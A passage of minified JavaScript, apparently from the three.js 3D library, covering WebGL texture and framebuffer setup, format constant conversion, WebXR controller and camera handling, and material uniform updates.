L=0,O=g.length;L<O;L++)l=g[L],r.format!==S&&r.format!==x?null!==f&&(w?n.compressedTexSubImage2D(e.TEXTURE_2D,L,0,0,l.width,l.height,f,l.data):n.compressedTexImage2D(e.TEXTURE_2D,L,v,l.width,l.height,0,l.data)):w?n.texSubImage2D(e.TEXTURE_2D,L,0,0,l.width,l.height,f,m,l.data):n.texImage2D(e.TEXTURE_2D,L,v,l.width,l.height,0,f,m,l.data)}else if(r.isDataTexture2DArray)w?(E&&n.texStorage3D(e.TEXTURE_2D_ARRAY,P,v,d.width,d.height,d.depth),n.texSubImage3D(e.TEXTURE_2D_ARRAY,0,0,0,0,d.width,d.height,d.depth,f,m,d.data)):n.texImage3D(e.TEXTURE_2D_ARRAY,0,v,d.width,d.height,d.depth,0,f,m,d.data);else if(r.isDataTexture3D)w?(E&&n.texStorage3D(e.TEXTURE_3D,P,v,d.width,d.height,d.depth),n.texSubImage3D(e.TEXTURE_3D,0,0,0,0,d.width,d.height,d.depth,f,m,d.data)):n.texImage3D(e.TEXTURE_3D,0,v,d.width,d.height,d.depth,0,f,m,d.data);else if(r.isFramebufferTexture)w&&E?n.texStorage2D(e.TEXTURE_2D,P,v,d.width,d.height):n.texImage2D(e.TEXTURE_2D,0,v,d.width,d.height,0,f,m,null);else if(0<g.length&&h){w&&E&&n.texStorage2D(e.TEXTURE_2D,P,v,g[0].width,g[0].height);for(var j=0,H=g.length;j<H;j++)l=g[j],w?n.texSubImage2D(e.TEXTURE_2D,j,0,0,f,m,l):n.texImage2D(e.TEXTURE_2D,j,v,f,m,l);r.generateMipmaps=!1}else w?(E&&n.texStorage2D(e.TEXTURE_2D,P,v,d.width,d.height),n.texSubImage2D(e.TEXTURE_2D,0,0,0,f,m,d)):n.texImage2D(e.TEXTURE_2D,0,v,f,m,d);R(r,h)&&U(o),t.__version=r.version,r.onUpdate&&r.onUpdate(r)}function ne(t,i,o,s,l){var c=a.convert(o.format),u=a.convert(o.type),d=$(o.internalFormat,c,u,o.encoding);r.get(i).__hasExternalTextures||(l===e.TEXTURE_3D||l===e.TEXTURE_2D_ARRAY?n.texImage3D(l,0,d,i.width,i.height,i.depth,0,c,u,null):n.texImage2D(l,0,d,i.width,i.height,0,c,u,null)),n.bindFramebuffer(e.FRAMEBUFFER,t),i.useRenderToTexture?I.framebufferTexture2DMultisampleEXT(e.FRAMEBUFFER,s,l,r.get(o).__webglTexture,0,ae(i)):e.framebufferTexture2D(e.FRAMEBUFFER,s,l,r.get(o).__webglTexture,0),n.bindFramebuffer(e.FRAMEBUFFER,null)}function re(t,n,r){if(e.bindRenderbuffer(e.RENDERBUFFER,t),n.depthBuffer&&!n.stencilBuffer){var i=e.DEPTH_COMPONENT16;if(r||n.useRenderToTexture){var o=n.depthTexture;o&&o.isDepthTexture&&(o.type===_?i=e.DEPTH_COMPONENT32F:o.type===b&&(i=e.DEPTH_COMPONENT24));var s=ae(n);n.useRenderToTexture?I.renderbufferStorageMultisampleEXT(e.RENDERBUFFER,s,i,n.width,n.height):e.renderbufferStorageMultisample(e.RENDERBUFFER,s,i,n.width,n.height)}else e.renderbufferStorage(e.RENDERBUFFER,i,n.width,n.height);e.framebufferRenderbuffer(e.FRAMEBUFFER,e.DEPTH_ATTACHMENT,e.RENDERBUFFER,t)}else if(n.depthBuffer&&n.stencilBuffer){var l=ae(n);r&&n.useRenderbuffer?e.renderbufferStorageMultisample(e.RENDERBUFFER,l,e.DEPTH24_STENCIL8,n.width,n.height):n.useRenderToTexture?I.renderbufferStorageMultisampleEXT(e.RENDERBUFFER,l,e.DEPTH24_STENCIL8,n.width,n.height):e.renderbufferStorage(e.RENDERBUFFER,e.DEPTH_STENCIL,n.width,n.height),e.framebufferRenderbuffer(e.FRAMEBUFFER,e.DEPTH_STENCIL_ATTACHMENT,e.RENDERBUFFER,t)}else{var c=!0===n.isWebGLMultipleRenderTargets?n.texture[0]:n.texture,u=a.convert(c.format),d=a.convert(c.type),p=$(c.internalFormat,u,d,c.encoding),h=ae(n);r&&n.useRenderbuffer?e.renderbufferStorageMultisample(e.RENDERBUFFER,h,p,n.width,n.height):n.useRenderToTexture?I.renderbufferStorageMultisampleEXT(e.RENDERBUFFER,h,p,n.width,n.height):e.renderbufferStorage(e.RENDERBUFFER,p,n.width,n.height)}e.bindRenderbuffer(e.RENDERBUFFER,null)}function ie(t){var i=r.get(t),a=!0===t.isWebGLCubeRenderTarget;if(t.depthTexture&&!i.__autoAllocateDepthBuffer){if(a)throw new Error("target.depthTexture not supported in Cube render targets");!function(t,i){if(i&&i.isWebGLCubeRenderTarget)throw new Error("Depth Texture with cube render targets is not supported");if(n.bindFramebuffer(e.FRAMEBUFFER,t),!i.depthTexture||!i.depthTexture.isDepthTexture)throw new Error("renderTarget.depthTexture must be an instance of THREE.DepthTexture");r.get(i.depthTexture).__webglTexture&&i.depthTexture.image.width===i.width&&i.depthTexture.image.height===i.height||(i.depthTexture.image.width=i.width,i.depthTexture.image.height=i.height,i.depthTexture.needsUpdate=!0),W(i.depthTexture,0);var a=r.get(i.depthTexture).__webglTexture,o=ae(i);if(i.depthTexture.format===k)i.useRenderToTexture?I.framebufferTexture2DMultisampleEXT(e.FRAMEBUFFER,e.DEPTH_ATTACHMENT,e.TEXTURE_2D,a,0,o):e.framebufferTexture2D(e.FRAMEBUFFER,e.DEPTH_ATTACHMENT,e.TEXTURE_2D,a,0);else{if(i.depthTexture.format!==M)throw new Error("Unknown depthTexture format");i.useRenderToTexture?I.framebufferTexture2DMultisampleEXT(e.FRAMEBUFFER,e.DEPTH_STENCIL_ATTACHMENT,e.TEXTURE_2D,a,0,o):e.framebufferTexture2D(e.FRAMEBUFFER,e.DEPTH_STENCIL_ATTACHMENT,e.TEXTURE_2D,a,0)}}(i.__webglFramebuffer,t)}else if(a){i.__webglDepthbuffer=[];for(var o=0;o<6;o++)n.bindFramebuffer(e.FRAMEBUFFER,i.__webglFramebuffer[o]),i.__webglDepthbuffer[o]=e.createRenderbuffer(),re(i.__webglDepthbuffer[o],t,!1)}else n.bindFramebuffer(e.FRAMEBUFFER,i.__webglFramebuffer),i.__webglDepthbuffer=e.createRenderbuffer(),re(i.__webglDepthbuffer,t,!1);n.bindFramebuffer(e.FRAMEBUFFER,null)}function ae(e){return B&&(e.useRenderbuffer||e.useRenderToTexture)?Math.min(P,e.samples):0}var oe=!1,se=!1;this.allocateTextureUnit=function(){var e=G;return G+=1,e},this.resetTextureUnits=function(){G=0},this.setTexture2D=W,this.setTexture2DArray=function(t,i){var a=r.get(t);0<t.version&&a.__version!==t.version?ee(a,t,i):(n.activeTexture(e.TEXTURE0+i),n.bindTexture(e.TEXTURE_2D_ARRAY,a.__webglTexture))},this.setTexture3D=function(t,i){var a=r.get(t);0<t.version&&a.__version!==t.version?ee(a,t,i):(n.activeTexture(e.TEXTURE0+i),n.bindTexture(e.TEXTURE_3D,a.__webglTexture))},this.setTextureCube=K,this.rebindTextures=function(t,n,i){var a=r.get(t);void 0!==n&&ne(a.__webglFramebuffer,t,t.texture,e.COLOR_ATTACHMENT0,e.TEXTURE_2D),void 0!==i&&ie(t)},this.setupRenderTarget=function(t){var s=t.texture,l=r.get(t),c=r.get(s);t.addEventListener("dispose",Q),!0!==t.isWebGLMultipleRenderTargets&&(void 0===c.__webglTexture&&(c.__webglTexture=e.createTexture()),c.__version=s.version,o.memory.textures++);var u=!0===t.isWebGLCubeRenderTarget,d=!0===t.isWebGLMultipleRenderTargets,p=s.isDataTexture3D||s.isDataTexture2DArray,h=D(t)||B;if(!B||s.format!==x||s.type!==_&&s.type!==w||(s.format=S),u){l.__webglFramebuffer=[];for(var f=0;f<6;f++)l.__webglFramebuffer[f]=e.createFramebuffer()}else if(l.__webglFramebuffer=e.createFramebuffer(),d){if(i.drawBuffers)for(var A=t.texture,m=0,v=A.length;m<v;m++){var g=r.get(A[m]);void 0===g.__webglTexture&&(g.__webglTexture=e.createTexture(),o.memory.textures++)}}else if(t.useRenderbuffer&&B){l.__webglMultisampledFramebuffer=e.createFramebuffer(),l.__webglColorRenderbuffer=e.createRenderbuffer(),e.bindRenderbuffer(e.RENDERBUFFER,l.__webglColorRenderbuffer);var y=a.convert(s.format),b=a.convert(s.type),C=$(s.internalFormat,y,b,s.encoding),k=ae(t);e.renderbufferStorageMultisample(e.RENDERBUFFER,k,C,t.width,t.height),n.bindFramebuffer(e.FRAMEBUFFER,l.__webglMultisampledFramebuffer),e.framebufferRenderbuffer(e.FRAMEBUFFER,e.COLOR_ATTACHMENT0,e.RENDERBUFFER,l.__webglColorRenderbuffer),e.bindRenderbuffer(e.RENDERBUFFER,null),t.depthBuffer&&(l.__webglDepthRenderbuffer=e.createRenderbuffer(),re(l.__webglDepthRenderbuffer,t,!0)),n.bindFramebuffer(e.FRAMEBUFFER,null)}if(u){n.bindTexture(e.TEXTURE_CUBE_MAP,c.__webglTexture),Y(e.TEXTURE_CUBE_MAP,s,h);for(var M=0;M<6;M++)ne(l.__webglFramebuffer[M],t,s,e.COLOR_ATTACHMENT0,e.TEXTURE_CUBE_MAP_POSITIVE_X+M);R(s,h)&&U(e.TEXTURE_CUBE_MAP),n.unbindTexture()}else if(d){for(var E=t.texture,T=0,P=E.length;T<P;T++){var I=E[T],F=r.get(I);n.bindTexture(e.TEXTURE_2D,F.__webglTexture),Y(e.TEXTURE_2D,I,h),ne(l.__webglFramebuffer,t,I,e.COLOR_ATTACHMENT0+T,e.TEXTURE_2D),R(I,h)&&U(e.TEXTURE_2D)}n.unbindTexture()}else{var L=e.TEXTURE_2D;p&&B&&(L=s.isDataTexture3D?e.TEXTURE_3D:e.TEXTURE_2D_ARRAY),n.bindTexture(L,c.__webglTexture),Y(L,s,h),ne(l.__webglFramebuffer,t,s,e.COLOR_ATTACHMENT0,L),R(s,h)&&U(L),n.unbindTexture()}t.depthBuffer&&ie(t)},this.updateRenderTargetMipmap=function(t){for(var i=D(t)||B,a=!0===t.isWebGLMultipleRenderTargets?t.texture:[t.texture],o=0,s=a.length;o<s;o++){var l=a[o];if(R(l,i)){var c=t.isWebGLCubeRenderTarget?e.TEXTURE_CUBE_MAP:e.TEXTURE_2D,u=r.get(l).__webglTexture;n.bindTexture(c,u),U(c),n.unbindTexture()}}},this.updateMultisampleRenderTarget=function(t){if(t.useRenderbuffer&&B){var i=t.width,a=t.height,o=e.COLOR_BUFFER_BIT,s=[e.COLOR_ATTACHMENT0],l=t.stencilBuffer?e.DEPTH_STENCIL_ATTACHMENT:e.DEPTH_ATTACHMENT;t.depthBuffer&&s.push(l),t.ignoreDepthForMultisampleCopy||(t.depthBuffer&&(o|=e.DEPTH_BUFFER_BIT),t.stencilBuffer&&(o|=e.STENCIL_BUFFER_BIT));var c=r.get(t);n.bindFramebuffer(e.READ_FRAMEBUFFER,c.__webglMultisampledFramebuffer),n.bindFramebuffer(e.DRAW_FRAMEBUFFER,c.__webglFramebuffer),t.ignoreDepthForMultisampleCopy&&(e.invalidateFramebuffer(e.READ_FRAMEBUFFER,[l]),e.invalidateFramebuffer(e.DRAW_FRAMEBUFFER,[l])),e.blitFramebuffer(0,0,i,a,0,0,i,a,o,e.NEAREST),e.invalidateFramebuffer(e.READ_FRAMEBUFFER,s),n.bindFramebuffer(e.READ_FRAMEBUFFER,null),n.bindFramebuffer(e.DRAW_FRAMEBUFFER,c.__webglMultisampledFramebuffer)}},this.setupDepthRenderbuffer=ie,this.setupFrameBufferTexture=ne,this.safeSetTexture2D=function(e,t){e&&e.isWebGLRenderTarget&&(!1===oe&&(oe=!0),e=e.texture),W(e,t)},this.safeSetTextureCube=function(e,t){e&&e.isWebGLCubeRenderTarget&&(!1===se&&(se=!0),e=e.texture),K(e,t)}}function ka(e,t,n){var r=n.isWebGL2;return{convert:function(n){var i;if(n===g)return e.UNSIGNED_BYTE;if(1017===n)return e.UNSIGNED_SHORT_4_4_4_4;if(1018===n)return e.UNSIGNED_SHORT_5_5_5_1;if(1019===n)return e.UNSIGNED_SHORT_5_6_5;if(1010===n)return e.BYTE;if(1011===n)return e.SHORT;if(n===y)return e.UNSIGNED_SHORT;if(1013===n)return e.INT;if(n===b)return e.UNSIGNED_INT;if(n===_)return e.FLOAT;if(n===w)return r?e.HALF_FLOAT:null!==(i=t.get("OES_texture_half_float"))?i.HALF_FLOAT_OES:null;if(1021===n)return e.ALPHA;if(n===x)return e.RGB;if(n===S)return e.RGBA;if(1024===n)return e.LUMINANCE;if(1025===n)return e.LUMINANCE_ALPHA;if(n===k)return e.DEPTH_COMPONENT;if(n===M)return e.DEPTH_STENCIL;if(1028===n)return e.RED;if(1029===n)return e.RED_INTEGER;if(1030===n)return e.RG;if(1031===n)return e.RG_INTEGER;if(1032===n)return e.RGB_INTEGER;if(1033===n)return e.RGBA_INTEGER;if(n===B||n===E||n===T||n===P){if(null===(i=t.get("WEBGL_compressed_texture_s3tc")))return null;if(n===B)return i.COMPRESSED_RGB_S3TC_DXT1_EXT;if(n===E)return i.COMPRESSED_RGBA_S3TC_DXT1_EXT;if(n===T)return i.COMPRESSED_RGBA_S3TC_DXT3_EXT;if(n===P)return i.COMPRESSED_RGBA_S3TC_DXT5_EXT}if(n===I||n===F||n===L||n===O){if(null===(i=t.get("WEBGL_compressed_texture_pvrtc")))return null;if(n===I)return i.COMPRESSED_RGB_PVRTC_4BPPV1_IMG;if(n===F)return i.COMPRESSED_RGB_PVRTC_2BPPV1_IMG;if(n===L)return i.COMPRESSED_RGBA_PVRTC_4BPPV1_IMG;if(n===O)return i.COMPRESSED_RGBA_PVRTC_2BPPV1_IMG}if(36196===n)return null!==(i=t.get("WEBGL_compressed_texture_etc1"))?i.COMPRESSED_RGB_ETC1_WEBGL:null;if((n===N||n===D)&&null!==(i=t.get("WEBGL_compressed_texture_etc"))){if(n===N)return i.COMPRESSED_RGB8_ETC2;if(n===D)return i.COMPRESSED_RGBA8_ETC2_EAC}return 37808===n||37809===n||37810===n||37811===n||37812===n||37813===n||37814===n||37815===n||37816===n||37817===n||37818===n||37819===n||37820===n||37821===n||37840===n||37841===n||37842===n||37843===n||37844===n||37845===n||37846===n||37847===n||37848===n||37849===n||37850===n||37851===n||37852===n||37853===n?null!==(i=t.get("WEBGL_compressed_texture_astc"))?n:null:36492===n?null!==(i=t.get("EXT_texture_compression_bptc"))?n:null:n===C?r?e.UNSIGNED_INT_24_8:null!==(i=t.get("WEBGL_depth_texture"))?i.UNSIGNED_INT_24_8_WEBGL:null:void 0}}}var Ma=function(e){_inherits2(n,Nn);var t=_createSuper(n);function n(){var e,r=0<arguments.length&&void 0!==arguments[0]?arguments[0]:[];return _classCallCheck2(this,n),(e=t.call(this)).cameras=r,e}return n}();Ma.prototype.isArrayCamera=!0;var Ba=function(e){_inherits2(n,_t);var t=_createSuper(n);function n(){var e;return _classCallCheck2(this,n),(e=t.call(this)).type="Group",e}return n}();Ba.prototype.isGroup=!0;var Ea={type:"move"},Ta=function(){function e(){_classCallCheck2(this,e),this._targetRay=null,this._grip=null,this._hand=null}return _createClass2(e,[{key:"getHandSpace",value:function(){return null===this._hand&&(this._hand=new Ba,this._hand.matrixAutoUpdate=!1,this._hand.visible=!1,this._hand.joints={},this._hand.inputState={pinching:!1}),this._hand}},{key:"getTargetRaySpace",value:function(){return null===this._targetRay&&(this._targetRay=new Ba,this._targetRay.matrixAutoUpdate=!1,this._targetRay.visible=!1,this._targetRay.hasLinearVelocity=!1,this._targetRay.linearVelocity=new ye,this._targetRay.hasAngularVelocity=!1,this._targetRay.angularVelocity=new ye),this._targetRay}},{key:"getGripSpace",value:function(){return null===this._grip&&(this._grip=new Ba,this._grip.matrixAutoUpdate=!1,this._grip.visible=!1,this._grip.hasLinearVelocity=!1,this._grip.linearVelocity=new ye,this._grip.hasAngularVelocity=!1,this._grip.angularVelocity=new ye),this._grip}},{key:"dispatchEvent",value:function(e){return null!==this._targetRay&&this._targetRay.dispatchEvent(e),null!==this._grip&&this._grip.dispatchEvent(e),null!==this._hand&&this._hand.dispatchEvent(e),this}},{key:"disconnect",value:function(e){return this.dispatchEvent({type:"disconnected",data:e}),null!==this._targetRay&&(this._targetRay.visible=!1),null!==this._grip&&(this._grip.visible=!1),null!==this._hand&&(this._hand.visible=!1),this}},{key:"update",value:function(e,t,n){var r=null,i=null,a=null,o=this._targetRay,s=this._grip,l=this._hand;if(e&&"visible-blurred"!==t.session.visibilityState)if(null!==o&&null!==(r=t.getPose(e.targetRaySpace,n))&&(o.matrix.fromArray(r.transform.matrix),o.matrix.decompose(o.position,o.rotation,o.scale),r.linearVelocity?(o.hasLinearVelocity=!0,o.linearVelocity.copy(r.linearVelocity)):o.hasLinearVelocity=!1,r.angularVelocity?(o.hasAngularVelocity=!0,o.angularVelocity.copy(r.angularVelocity)):o.hasAngularVelocity=!1,this.dispatchEvent(Ea)),l&&e.hand){a=!0;var c,u=_createForOfIteratorHelper(e.hand.values());try{for(u.s();!(c=u.n()).done;){var d=c.value,p=t.getJointPose(d,n);if(void 0===l.joints[d.jointName]){var h=new Ba;h.matrixAutoUpdate=!1,h.visible=!1,l.joints[d.jointName]=h,l.add(h)}var f=l.joints[d.jointName];null!==p&&(f.matrix.fromArray(p.transform.matrix),f.matrix.decompose(f.position,f.rotation,f.scale),f.jointRadius=p.radius),f.visible=null!==p}}catch(e){u.e(e)}finally{u.f()}var A=l.joints["index-finger-tip"],m=l.joints["thumb-tip"],v=A.position.distanceTo(m.position);l.inputState.pinching&&.025<v?(l.inputState.pinching=!1,this.dispatchEvent({type:"pinchend",handedness:e.handedness,target:this})):!l.inputState.pinching&&v<=.015&&(l.inputState.pinching=!0,this.dispatchEvent({type:"pinchstart",handedness:e.handedness,target:this}))}else null!==s&&e.gripSpace&&null!==(i=t.getPose(e.gripSpace,n))&&(s.matrix.fromArray(i.transform.matrix),s.matrix.decompose(s.position,s.rotation,s.scale),i.linearVelocity?(s.hasLinearVelocity=!0,s.linearVelocity.copy(i.linearVelocity)):s.hasLinearVelocity=!1,i.angularVelocity?(s.hasAngularVelocity=!0,s.angularVelocity.copy(i.angularVelocity)):s.hasAngularVelocity=!1);return null!==o&&(o.visible=null!==r),null!==s&&(s.visible=null!==i),null!==l&&(l.visible=null!==a),this}}]),e}(),Pa=function(e){_inherits2(n,pe);var t=_createSuper(n);function n(e,r,i,a,o,s,l,c,u,d){var h;if(_classCallCheck2(this,n),(d=void 0!==d?d:k)!==k&&d!==M)throw new Error("DepthTexture format must be either THREE.DepthFormat or THREE.DepthStencilFormat");return void 0===i&&d===k&&(i=y),void 0===i&&d===M&&(i=C),(h=t.call(this,null,a,o,s,l,c,d,i,u)).image={width:e,height:r},h.magFilter=void 0!==l?l:p,h.minFilter=void 0!==c?c:p,h.flipY=!1,h.generateMipmaps=!1,h}return n}();Pa.prototype.isDepthTexture=!0;var Ia=function(e){_inherits2(n,H);var t=_createSuper(n);function n(e,r){var i;_classCallCheck2(this,n);var a=_assertThisInitialized2(i=t.call(this)),o=null,s=1,l=null,c="local-floor",u=e.extensions.has("WEBGL_multisampled_render_to_texture"),d=null,p=null,h=null,f=null,A=!1,m=null,v=r.getContextAttributes(),b=null,_=null,w=[],B=new Map,E=new Nn;E.layers.enable(1),E.viewport=new fe;var T=new Nn;T.layers.enable(2),T.viewport=new fe;var P=[E,T],I=new Ma;I.layers.enable(1),I.layers.enable(2);var F=null,L=null;function O(e){var t=B.get(e.inputSource);t&&t.dispatchEvent({type:e.type,data:e.inputSource})}function N(){B.forEach((function(e,t){e.disconnect(t)})),B.clear(),L=F=null,e.setRenderTarget(b),_=o=p=h=f=null,z.stop(),a.isPresenting=!1,a.dispatchEvent({type:"sessionend"})}function D(e){for(var t=o.inputSources,n=0;n<w.length;n++)B.set(t[n],w[n]);for(var r=0;r<e.removed.length;r++){var i=e.removed[r],a=B.get(i);a&&(a.dispatchEvent({type:"disconnected",data:i}),B.delete(i))}for(var s=0;s<e.added.length;s++){var l=e.added[s],c=B.get(l);c&&c.dispatchEvent({type:"connected",data:l})}}i.cameraAutoUpdate=!0,i.enabled=!1,i.isPresenting=!1,i.getController=function(e){var t=w[e];return void 0===t&&(t=new Ta,w[e]=t),t.getTargetRaySpace()},i.getControllerGrip=function(e){var t=w[e];return void 0===t&&(t=new Ta,w[e]=t),t.getGripSpace()},i.getHand=function(e){var t=w[e];return void 0===t&&(t=new Ta,w[e]=t),t.getHandSpace()},i.setFramebufferScaleFactor=function(e){s=e,a.isPresenting},i.setReferenceSpaceType=function(e){c=e,a.isPresenting},i.getReferenceSpace=function(){return l},i.getBaseLayer=function(){return null!==h?h:f},i.getBinding=function(){return p},i.getFrame=function(){return m},i.getSession=function(){return o},i.setSession=function(){var t=_asyncToGenerator(regeneratorRuntime.mark((function t(n){var i,d,m,w,B;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:if(null===(o=n)){t.next=23;break}if(b=e.getRenderTarget(),o.addEventListener("select",O),o.addEventListener("selectstart",O),o.addEventListener("selectend",O),o.addEventListener("squeeze",O),o.addEventListener("squeezestart",O),o.addEventListener("squeezeend",O),o.addEventListener("end",N),o.addEventListener("inputsourceschange",D),!0!==v.xrCompatible)return t.next=14,r.makeXRCompatible();t.next=14;break;case 14:return _=void 0===o.renderState.layers||!1===e.capabilities.isWebGL2?(i={antialias:void 0!==o.renderState.layers||v.antialias,alpha:v.alpha,depth:v.depth,stencil:v.stencil,framebufferScaleFactor:s},f=new XRWebGLLayer(o,r,i),o.updateRenderState({baseLayer:f}),new Ae(f.framebufferWidth,f.framebufferHeight,{format:S,type:g,encoding:e.outputEncoding})):(A=v.antialias,w=m=d=null,v.depth&&(w=v.stencil?r.DEPTH24_STENCIL8:r.DEPTH_COMPONENT24,d=v.stencil?M:k,m=v.stencil?C:y),B={colorFormat:v.alpha||A?r.RGBA8:r.RGB8,depthFormat:w,scaleFactor:s},p=new XRWebGLBinding(o,r),h=p.createProjectionLayer(B),o.updateRenderState({layers:[h]}),A?new ve(h.textureWidth,h.textureHeight,{format:S,type:g,depthTexture:new Pa(h.textureWidth,h.textureHeight,m,void 0,void 0,void 0,void 0,void 0,void 0,d),stencilBuffer:v.stencil,ignoreDepth:h.ignoreDepthValues,useRenderToTexture:u,encoding:e.outputEncoding}):new Ae(h.textureWidth,h.textureHeight,{format:v.alpha?S:x,type:g,depthTexture:new Pa(h.textureWidth,h.textureHeight,m,void 0,void 0,void 0,void 0,void 0,void 0,d),stencilBuffer:v.stencil,ignoreDepth:h.ignoreDepthValues,encoding:e.outputEncoding})),this.setFoveation(1),t.next=18,o.requestReferenceSpace(c);case 18:l=t.sent,z.setContext(o),z.start(),a.isPresenting=!0,a.dispatchEvent({type:"sessionstart"});case 23:case"end":return t.stop()}}),t,this)})));return function(e){return t.apply(this,arguments)}}();var R=new ye,j=new ye;function U(e,t){null===t?e.matrixWorld.copy(e.matrix):e.matrixWorld.multiplyMatrices(t.matrixWorld,e.matrix),e.matrixWorldInverse.copy(e.matrixWorld).invert()}i.updateCamera=function(e){if(null!==o){I.near=T.near=E.near=e.near,I.far=T.far=E.far=e.far,F===I.near&&L===I.far||(o.updateRenderState({depthNear:I.near,depthFar:I.far}),F=I.near,L=I.far);var t=e.parent,n=I.cameras;U(I,t);for(var r=0;r<n.length;r++)U(n[r],t);I.matrixWorld.decompose(I.position,I.quaternion,I.scale),e.position.copy(I.position),e.quaternion.copy(I.quaternion),e.scale.copy(I.scale),e.matrix.copy(I.matrix),e.matrixWorld.copy(I.matrixWorld);for(var i=e.children,a=0,s=i.length;a<s;a++)i[a].updateMatrixWorld(!0);2===n.length?function(e,t,n){R.setFromMatrixPosition(t.matrixWorld),j.setFromMatrixPosition(n.matrixWorld);var r=R.distanceTo(j),i=t.projectionMatrix.elements,a=n.projectionMatrix.elements,o=i[14]/(i[10]-1),s=i[14]/(i[10]+1),l=(i[9]+1)/i[5],c=(i[9]-1)/i[5],u=(i[8]-1)/i[0],d=(a[8]+1)/a[0],p=o*u,h=o*d,f=r/(-u+d),A=f*-u;t.matrixWorld.decompose(e.position,e.quaternion,e.scale),e.translateX(A),e.translateZ(f),e.matrixWorld.compose(e.position,e.quaternion,e.scale),e.matrixWorldInverse.copy(e.matrixWorld).invert();var m=o+f,v=s+f,g=p-A,y=h+(r-A),b=l*s/v*m,_=c*s/v*m;e.projectionMatrix.makePerspective(g,y,b,_,m,v)}(I,E,T):I.projectionMatrix.copy(E.projectionMatrix)}},i.getCamera=function(){return I},i.getFoveation=function(){return null!==h?h.fixedFoveation:null!==f?f.fixedFoveation:void 0},i.setFoveation=function(e){null!==h&&(h.fixedFoveation=e),null!==f&&void 0!==f.fixedFoveation&&(f.fixedFoveation=e)};var $=null,z=new Wn;return z.setAnimationLoop((function(t,n){if(d=n.getViewerPose(l),m=n,null!==d){var r=d.views;null!==f&&(e.setRenderTargetFramebuffer(_,f.framebuffer),e.setRenderTarget(_));var i=!1;r.length!==I.cameras.length&&(i=!(I.cameras.length=0));for(var a=0;a<r.length;a++){var s=r[a],c=null;if(null!==f)c=f.getViewport(s);else{var u=p.getViewSubImage(h,s);c=u.viewport,0===a&&(e.setRenderTargetTextures(_,u.colorTexture,h.ignoreDepthValues?void 0:u.depthStencilTexture),e.setRenderTarget(_))}var A=P[a];A.matrix.fromArray(s.transform.matrix),A.projectionMatrix.fromArray(s.projectionMatrix),A.viewport.set(c.x,c.y,c.width,c.height),0===a&&I.matrix.copy(A.matrix),!0===i&&I.cameras.push(A)}}for(var v=o.inputSources,g=0;g<w.length;g++){var y=w[g],b=v[g];y.update(b,n,l)}$&&$(t,n),m=null})),i.setAnimationLoop=function(e){$=e},i.dispose=function(){},i}return n}();function Fa(e){function t(t,n){t.opacity.value=n.opacity,n.color&&t.diffuse.value.copy(n.color),n.emissive&&t.emissive.value.copy(n.emissive).multiplyScalar(n.emissiveIntensity),n.map&&(t.map.value=n.map),n.alphaMap&&(t.alphaMap.value=n.alphaMap),n.specularMap&&(t.specularMap.value=n.specularMap),0<n.alphaTest&&(t.alphaTest.value=n.alphaTest);var r,i,a=e.get(n).envMap;a&&(t.envMap.value=a,t.flipEnvMap.value=a.isCubeTexture&&!1===a.isRenderTargetTexture?-1:1,t.reflectivity.value=n.reflectivity,t.ior.value=n.ior,t.refractionRatio.value=n.refractionRatio),n.lightMap&&(t.lightMap.value=n.lightMap,t.lightMapIntensity.value=n.lightMapIntensity),n.aoMap&&(t.aoMap.value=n.aoMap,t.aoMapIntensity.value=n.aoMapIntensity),n.map?r=n.map:n.specularMap?r=n.specularMap:n.displacementMap?r=n.displacementMap:n.normalMap?r=n.normalMap:n.bumpMap?r=n.bumpMap:n.roughnessMap?r=n.roughnessMap:n.metalnessMap?r=n.metalnessMap:n.alphaMap?r=n.alphaMap:n.emissiveMap?r=n.emissiveMap:n.clearcoatMap?r=n.clearcoatMap:n.clearcoatNormalMap?r=n.clearcoatNormalMap:n.clearcoatRoughnessMap?r=n.clearcoatRoughnessMap:n.specularIntensityMap?r=n.specularIntensityMap:n.specularColorMap?r=n.specularColorMap:n.transmissionMap?r=n.transmissionMap:n.thicknessMap?r=n.thicknessMap:n.sheenColorMap?r=n.sheenColorMap:n.sheenRoughnessMap&&(r=n.sheenRoughnessMap),void 0!==r&&(r.isWebGLRenderTarget&&(r=r.texture),!0===r.matrixAutoUpdate&&r.updateMatrix(),t.uvTransform.value.copy(r.matrix)),n.aoMap?i=n.aoMap:n.lightMap&&(i=n.lightMap),void 0!==i&&(i.isWebGLRenderTarget&&(i=i.texture),!0===i.matrixAutoUpdate&&i.updateMatrix(),t.uv2Transform.value.copy(i.matrix))}function n(t,n){t.roughness.value=n.roughness,t.metalness.value=n.metalness,n.roughnessMap&&(t.roughnessMap.value=n.roughnessMap),n.metalnessMap&&(t.metalnessMap.value=n.metalnessMap),n.emissiveMap&&(t.emissiveMap.value=n.emissiveMap),n.bumpMap&&(t.bumpMap.value=n.bumpMap,t.bumpScale.value=n.bumpScale,1===n.side&&(t.bumpScale.value*=-1)),n.normalMap&&(t.normalMap.value=n.normalMap,t.normalScale.value.copy(n.normalScale),1===n.side&&t.normalScale.value.negate()),n.displacementMap&&(t.displacementMap.value=n.displacementMap,t.displacementScale.value=n.displacementScale,t.displacementBias.value=n.displacementBias),e.get(n).envMap&&(t.envMapIntensity.value=n.envMapIntensity)}return{refreshFogUniforms:function(e,t){e.fogColor.value.copy(t.color),t.isFog?(e.fogNear.value=t.near,e.fogFar.value=t.far):t.isFogExp2&&(e.fogDensity.value=t.density)},refreshMaterialUniforms:function(e,r,i,a,o){var s,l,c,u,d,p,h,f,A,m,v,g,y,b,_,w,C,x,S,k,M,B,E,T,P,I,F,L,O;r.isMeshBasicMaterial?t(e,r):r.isMeshLambertMaterial?(t(e,r),h=e,(f=r).emissiveMap&&(h.emissiveMap.value=f.emissiveMap)):r.isMeshToonMaterial?(t(e,r),L=e,(O=r).gradientMap&&(L.gradientMap.value=O.gradientMap),O.emissiveMap&&(L.emissiveMap.value=O.emissiveMap),O.bumpMap&&(L.bumpMap.value=O.bumpMap,L.bumpScale.value=O.bumpScale,1===O.side&&(L.bumpScale.value*=-1)),O.normalMap&&(L.normalMap.value=O.normalMap,L.normalScale.value.copy(O.normalScale),1===O.side&&L.normalScale.value.negate()),O.displacementMap&&(L.displacementMap.value=O.displacementMap,L.displacementScale.value=O.displacementScale,L.displacementBias.value=O.displacementBias)):r.isMeshPhongMaterial?(t(e,r),F=r,(I=e).specular.value.copy(F.specular),I.shininess.value=Math.max(F.shininess,1e-4),F.emissiveMap&&(I.emissiveMap.value=F.emissiveMap),F.bumpMap&&(I.bumpMap.value=F.bumpMap,I.bumpScale.value=F.bumpScale,1===F.side&&(I.bumpScale.value*=-1)),F.normalMap&&(I.no